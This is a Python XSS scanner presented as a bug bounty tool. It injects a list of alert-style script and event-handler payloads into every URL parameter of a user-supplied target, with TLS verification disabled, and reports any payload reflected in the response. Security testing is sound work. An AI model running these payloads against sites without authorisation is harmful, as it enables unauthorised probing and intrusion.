import requests
import sys
import re
from colorama import Fore, init
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse

init(autoreset=True)

BANNER = """
██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗██████╗  ██████╗ ████████╗
╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██╔═══██╗╚══██╔══╝
 ╚███╔╝ ███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║██████╔╝██║   ██║   ██║   
 ██╔██╗ ╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║██╔══██╗██║   ██║   ██║   
██╔╝ ██╗███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝    ╚═╝   
            XSS-ScanBot - By Ambuj Tiwari | Bug Bounty Tool
"""

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "'\"><img src=x onerror=alert(1)>",
    "<iframe src=javascript:alert('XSS')>",
]

def get_forms(url):
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        r = requests.get(url, headers=headers, timeout=10, verify=False)
        forms = re.findall(r'<form[^>]*>.*?</form>', r.text, re.DOTALL)
        return forms, r.text
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
        return [], ""

def get_params_from_url(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return params, parsed

def test_xss_in_url(url):
    params, parsed = get_params_from_url(url)
    if not params:
        print(Fore.YELLOW + "[-] No URL parameters found to test")
        return

    print(Fore.YELLOW + f"[*] Testing {len(params)} parameters...\n")
    vulnerable = []

    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param] = [payload]
            new_query = urlencode(test_params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))

            try:
                headers = {"User-Agent": "Mozilla/5.0"}
                r = requests.get(new_url, headers=headers, timeout=10, verify=False)
                if payload in r.text:
                    print(Fore.RED + f"[VULNERABLE] Parameter: {param}")
                    print(Fore.RED + f"  Payload: {payload}")
                    print(Fore.RED + f"  URL: {new_url}\n")
                    vulnerable.append({
                        "param": param,
                        "payload": payload,
                        "url": new_url
                    })
                    break
                else:
                    print(Fore.GREEN + f"[SAFE] {param} → {payload[:30]}...")
            except Exception as e:
                print(Fore.RED + f"[!] Error: {e}")

    if vulnerable:
        domain = urlparse(url).netloc
        filename = f"{domain}_xss_results.txt"
        with open(filename, "w") as f:
            for v in vulnerable:
                f.write(f"Param: {v['param']}\n")
                f.write(f"Payload: {v['payload']}\n")
                f.write(f"URL: {v['url']}\n\n")
        print(Fore.RED + f"\n[!] {len(vulnerable)} vulnerable parameters found!")
        print(Fore.GREEN + f"[+] Results saved to: {filename}")
    else:
        print(Fore.GREEN + "\n[+] No XSS vulnerabilities found.")

def main():
    print(Fore.CYAN + BANNER)

    if len(sys.argv) > 1:
        url = sys.argv[1]
    else:
        url = input(Fore.CYAN + "\nEnter Target URL (with params): ")

    if not url.startswith("http"):
        url = "https://" + url

    print(Fore.YELLOW + f"\n[*] Target: {url}")
    print(Fore.YELLOW + "[*] Starting XSS Scan...\n")
    test_xss_in_url(url)

if __name__ == "__main__":
    main()
